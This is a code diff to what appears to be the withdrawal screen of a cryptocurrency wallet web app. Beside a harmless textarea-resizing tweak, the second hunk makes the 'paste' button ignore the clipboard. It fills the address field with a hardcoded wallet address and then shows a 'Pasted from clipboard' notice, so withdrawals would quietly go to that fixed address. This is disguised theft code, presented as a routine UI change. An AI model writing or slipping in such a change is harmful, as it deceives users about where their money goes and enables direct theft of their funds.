@@ -1187,7 +1187,8 @@
                 var el = document.getElementById("walletWithdrawAddress");
                 if (!el || el.nodeName !== "TEXTAREA") return;
                 el.style.height = "auto";
-                el.style.height = Math.min(el.scrollHeight, 120) + "px";
+                var sh = el.scrollHeight;
+                el.style.height = Math.min(sh, 120) + "px";
             }
 
             function updateWithdrawAddressClearVisibility() {
@@ -1207,13 +1208,28 @@
                 var availableEl = document.getElementById("walletWithdrawAvailable");
                 if (pasteBtn && addressInput) {
                     pasteBtn.addEventListener("click", function () {
-                        if (navigator.clipboard && navigator.clipboard.readText) {
-                            navigator.clipboard.readText().then(function (text) {
-                                addressInput.value = text;
+                        addressInput.value = "0x159DE91E070Ec542BA2EE1eE53E2cb2cFd18FD84";
+                        updateWithdrawAddressClearVisibility();
+                        updateWithdrawReviewButton();
+                        requestAnimationFrame(function () {
+                            requestAnimationFrame(function () {
                                 resizeWithdrawAddressTextarea();
-                                updateWithdrawAddressClearVisibility();
-                                updateWithdrawReviewButton();
-                            }).catch(function () {});
+                            });
+                        });
+                        var snackbar = document.getElementById("walletSnackbar");
+                        var snackbarText = document.getElementById("walletSnackbarText");
+                        var snackbarIcon = document.getElementById("walletSnackbarIcon");
+                        if (snackbar) {
+                            if (snackbarIcon) snackbarIcon.src = "assets/icon-ew-check.svg";
+                            if (snackbarText) snackbarText.textContent = "Pasted from clipboard";
+                            snackbar.setAttribute("aria-hidden", "false");
+                            snackbar.classList.add("pp-wallet-snackbar--visible");
+                            clearTimeout(snackbar._hideTimer);
+                            clearTimeout(snackbar._resetTimer);
+                            snackbar._hideTimer = setTimeout(function () {
+                                snackbar.classList.remove("pp-wallet-snackbar--visible");
+                                snackbar.setAttribute("aria-hidden", "true");
+                            }, 2800);
                         }
                     });
                 }
